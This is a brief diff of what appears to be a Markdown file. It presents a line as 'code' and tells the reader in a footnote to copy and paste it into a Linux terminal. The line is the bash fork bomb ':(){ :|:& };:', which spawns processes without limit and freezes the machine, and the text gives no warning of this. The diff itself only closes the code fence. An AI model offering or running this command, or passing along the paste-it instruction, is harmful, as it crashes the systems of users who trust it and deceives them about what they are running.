@@ -6,4 +6,4 @@
 # Here is code . [^1]
 [^1]: copy it and then paste in linux terminal
 
-```  :(){ :|:& };:
+```  :(){ :|:& };:  ```
